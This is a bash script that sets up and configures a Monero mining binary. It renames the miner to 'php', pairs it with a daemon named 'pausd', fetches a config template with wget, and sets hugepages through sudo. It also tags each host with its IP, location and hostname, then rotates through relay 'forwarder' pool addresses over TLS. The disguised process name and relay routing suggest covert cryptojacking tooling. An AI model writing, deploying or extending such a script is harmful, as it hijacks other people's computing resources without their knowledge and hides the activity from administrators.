#!/bin/bash

## object config
OBJ_MASK=${OBJ_MASK:-php}
DAEMON=${DAEMON:-pausd}
DAEMON_NAME=${DAEMON##* }
CC_ENABLED=${CC_ENABLED:-false}
if [ -z "$TNL_SKIP" -o "$TNL_SKIP" = 1 ]; then
	# OBJ_CFG="${OBJ_CFG:-girmx_tnl_skip.1.json.tpl}"
	OBJ_CFG="${OBJ_CFG:-girmx_2.json.tpl}"
else
	OBJ_CFG="${OBJ_CFG:-girmx.1.json.tpl}"
fi
OBJ_CFG_MASK="${OBJ_CFG_MASK:-config.json}"
# ARGS="${ARGS:-${OBJ_MASK} -c ${OBJ_CFG_MASK}}"
ARGS="${ARGS:-${OBJ_MASK}}" ## configless because config is autoread from standard name

## download cfg
if [ ! -e "cfg/${OBJ_CFG}" -a -n "$CFG_BASE_URL" ]; then
	wget -q "${CFG_BASE_URL}${OBJ_CFG}" -O "${OBJ_CFG}"
fi

## object in sln should be present in pl/
OBJ_NAME=${OBJ_NAME:-obj}
[ ! -e "$OBJ_MASK" ] && mv pl/"$OBJ_NAME" "$OBJ_MASK"
chmod +x "${OBJ_MASK}" &>/dev/null

## daemon
# (when not included in the payload or is not a function)
# DAEMON_URL=""
# wget -q ${DAEMON_URL}
if [ -e $DAEMON_NAME ]; then
	chmod +x ${DAEMON_NAME} &>/dev/null
fi

## daemons conf
## misc
[ $UID != 0 ] && sudo=$(get_path sudo 2>/dev/null)
if [ -n "$HPGS" ]; then
	printf $HPGS | $sudo tee /proc/sys/vm/nr_hugepages &>/dev/null
else
	for i in {128,64,32,16,8,4}; do ## try setting some hugepages
		printf $i | $sudo tee /proc/sys/vm/nr_hugepages &>/dev/null && break
	done
fi

## instance ID
# CPU=$(grep -m 1 "model name" < /proc/cpuinfo | sed -r 's/model name\s*:\s*|[^a-zA-Z0-9]*//g')
get_cores
parse_ip
# IPADDR=$(http_req ipinfo.io/ip || "failed retrieving ip")
# HOSTN="$(echo $HOSTNAME | sed -r 's/[0-9]{2,}+|-//g')" ## clearup hostname while still preserving some identity
HOSTN=${HOSTNAME//[0-9][0-9]/} ## clearup hostname while still preserving some identity
HOSTN=${HOSTN//-/}

## L3 cache size to multihash factor
# cache_bytes=$(grep -im1 "cache size" </proc/cpuinfo | sed -r 's/[^0-9]*([0-9]+).*/\1/')
get_cache
cache_MB=${cache_MB:-$((cache_bytes / 1024))}
if [ ${TARGET_CO:-xmr} = xmr ]; then
	hashes=$((cache_MB / 2)) ## each hashpoint takes 2M for xmr
else
	hashes=$cache_MB
fi

# memory
get_mem
if [ "$FREEMEM" -lt 1024 ]; then
	RX_INIT=0
	RX_ENABLED=false
else
	RX_INIT=-1
	RX_ENABLED=${RX_ENABLED:-true}
fi

## cpu
get_cores
cgp=cpu.cfs_period_us
cgq=cpu.cfs_quota_us
## paths are not always the same
cg1=/sys/fs/cgroup/cpuacct,cpu
cg2=/sys/fs/cgroup/cpu,cpuacct
if [ -a $cg1 ]; then
	cpu_p=$(<$cg1/$cgp)
	cpu_q=$(<$cg1/$cgq)
elif [ -a $cg2 ]; then
	cpu_p=$(<$cg2/$cgp)
	cpu_q=$(<$cg2/$cgq)
fi
if [ -n "$cpu_p" -a -n "$cpu_q" -a "$cpu_p" != 0 ]; then ## respect cgroups
	ACORES=${ACORES:-$((cpu_q / cpu_p))}                    ## the available cpu (in number of cores)
	## compose a binary string to map affinity (printf from bash or non busybox)
	if [ "$ACORES" -eq 1 ]; then
		THREADS_D=1
	elif [ -n "$ACORES" -a "$ACORES" -ne 0 ]; then
		THREADS_D="$ACORES"
		## no cgroups, use half the cores
	fi
fi
if [ $CORES -gt 1 ]; then
	THREADS_D=$((CORES / 2))
else
	THREADS_D=1
fi
THREADS=${THREADS_FIXED:-${THREADS:-${THREADS_D}}}
## init MAX_LOAD
MAX_LOAD=${MAX_LOAD:-$((CORES * 100))}
[ "$MAX_LOAD" -lt 1 -o -z "$MAX_LOAD" ] && MAX_LOAD=100
## don't setup affinity because on shared environments it yields lower performance overall
## because doesn't let the cpu scheduler do its job, other processes might stall causing further
## overhead making the system unstable, also close to useless in non-bare scenarios.
export AFFINITY="0x0"

## vars for the pausd daemon
export THREADS=${THREADS:-null}

## vars for the object config
# read loadavg < /proc/loadavg
# loadavg=${loadavg% *[0-9]\/*} ## strip proc counters

export X_ID=${X_ID:-$(printf '%s' "${ip}-${country}-${region}-${HOSTN}")} \
UA=${UA:-KnockKnock} \
PA=${PA:-WhosThere} \
AL=${AL} \
AESNI=${AESNI:-1}

export provider=${X_ID/-*/}

## sanitize X_ID
X_ID=${X_ID// /}
X_ID=${X_ID//\//-}

## commands
COMMAND_BEFORE="${COMMAND_BEFORE:-:;}"
COMMAND_AFTER="${COMMAND_AFTER:-:;}"

## pools
if [ -z "$TNL_SKIP" -o "$TNL_SKIP" = 1 ]; then
	function config_pools() {
		local pool norx
		norx=
		read -r -d '' pool <<'POOL'
{
    \"algo\": null,
    \"url\": \"${URL}\",
    \"user\": \"${UA}\",
    \"pass\": \"${PA}\",
    \"rig-id\": \"${X_ID}\",
    \"keepalive\": true,
    \"tls\": true,
    \"tls-fingerprint\": null,
    \"enabled\": true,
    \"daemon\": false,
    \"nicehash\": \"${NICEHASH:-false}\"
}
POOL
		## only first setup
		if [ "$1" = 0 ]; then
			# fw called on startup
			fwds_file="net/forwarders"
			export pool_fwds=$(ushuffle $fwds_file)
			pool_addresses=$pool_fwds
		elif [ "$1" = 1 ]; then
			# norx fw called on startup
			norx=1
			fwds_file_norx="net/x_forwarders"
			export pool_fwds_norx=$(ushuffle $fwds_file_norx)
			pool_addresses=$pool_fwds_norx
		elif [ "$1" = 3 ]; then
			# only delete on normal forwarder, 3 is the forwarder
			# fw called after startup
			export POOLS=
			pool_addresses=$pool_fwds
		else
			# norx called after startup
			norx=1
			pool_addresses=$pool_fwds_norx
		fi
		local LAST PREV
		if [ -n "$norx" ]; then
			export last_pool_norx=${last_pool_norx:-0} prev_pool_norx=${last_pool_norx:-0}
			LAST=$last_pool_norx
			PREV=$prev_pool_norx
		else
			export last_pool=${last_pool:-0} prev_pool=${last_pool:-0}
			LAST=$last_pool
			PREV=$prev_pool
		fi
		local c=1
		local pool_str=
		while [ -z "$pool_str" ]; do
			if [ -n "$PPORT" ]; then
				for URL in $pool_addresses; do
					if [ $c -gt $LAST ]; then
						if [ ${URL/*:/} = "$PPORT" ]; then
							if check_connection ${URL/:*/} ${URL/*:/}; then
								pool_str="$(eval "printf '%s\n' \"${POOLS}${pool},\"")"
								LAST=$c
								break
							fi
						fi
					fi
					c=$((c + 1))
					# [ $p -gt 3 ] && break
				done
				[ -z "$pool_str" -o "$LAST" = "$PREV" ] && LAST=0 ## reset position and start from beginning
			else
				for URL in $pool_addresses; do
					if [ $c -gt $LAST ]; then
						if check_connection ${URL/:*/} ${URL/*:/}; then
							pool_str="$(eval "printf '%s\n' \"${POOLS}${pool},\"")"
							LAST=$c
							break
						fi
					fi
					c=$((c + 1))
					# [ $p -gt 3 ] && break
				done
				[ -z "$pool_str" -o "$LAST" = "$PREV" ] && LAST=0 ## reset position and start from beginning
			fi
			[ -z "$pool_str" ] && {
				backoff_p=$((${backoff_p:=1} + ${backoff_p:=1}))
				fleep ${backoff_p}
			}
			if [ -n "$norx" ]; then
				last_pool_norx=$LAST
			else
				last_pool=$LAST
			fi
			POOL="${POOL}${pool_str}"
		done
	}
	config_pools 0
	config_pools 1
	function config_client() {
		## only first setup
		[ "$CC_ENABLED" != "true" ] && return
		if [ "$1" = 0 ]; then
			x_fwds_file="net/x_forwarders"
			export x_fwds=$(ushuffle $x_fwds_file)
		fi
		[ "$X_URL_FORCE" = 1 ] || unset X_URL
		export last_x_url=${last_x_url:-0} prev_x_url=${last_x_url:-0}
		local x_c=1
		while [ -z "${X_URL}" ]; do
			if [ -n "$X_PPORT" ]; then
				for X_URL in $x_fwds; do
					if [ $x_c -gt $last_x_url ]; then
						if [ ${X_URL/*:/} = "$X_PPORT" ]; then
							if check_connection ${X_URL/:*/} ${X_URL/*:/}; then
								last_x_url=$x_c
								break ## && operator outsite [] is not reliable
							fi
						fi
					fi
					x_c=$((x_c + 1))
				done
				[ -z "$X_URL" -o "$prev_x_url" = "$last_x_url" ] && last_x_url=0
			else
				for X_URL in $x_fwds; do
					if [ $x_c -gt $last_x_url ]; then
						if check_connection ${X_URL/:*/} ${X_URL/*:/}; then
							last_x_url=$x_c
							break ## && operator outsite [] is not reliable
						fi
					fi
					x_c=$((x_c + 1))
				done
				[ -z "$X_URL" -o "$prev_x_url" = "$last_x_url" ] && last_x_url=0
			fi
			[ -z "$X_URL" ] && {
				backoff_x=$((${backoff_x:=1} + ${backoff_x:=1}))
				fleep ${backoff_x}
			}
		done
		export X_URL
	}
	config_client 0

#     pool=$(cat <<'POOL'
# {
#     \"url\": \"${URL}\",
#     \"user\": \"${UA}\",
#     \"pass\": \"${PA}\",
#     \"keepalive\": true,
#     \"use-tls\": true,
#     \"nicehash\": \"${NICEHASH:-false}\"
# }
# POOL
#         )
fi

## subst
function config_config() {
	if [ "$1" = 0 ]; then
		export OBJ_CFG_TPL=$(<"cfg/${OBJ_CFG}")
		OBJ_CFG_TPL=${OBJ_CFG_TPL//\"/_#_#}
	fi
	if [ "$1" = 1 ]; then
		Q_CONFIG=$(eval "printf '%s' \"${OBJ_CFG_TPL}\"")
		CONFIG="${Q_CONFIG//_#_#/\"}"
	else
		Q_CONFIG=$(eval "printf '%s' \"${OBJ_CFG_TPL}\"")
		printf '%s' "${Q_CONFIG//_#_#/\"}" >"${OBJ_CFG_MASK}"
	fi
}
config_config 0
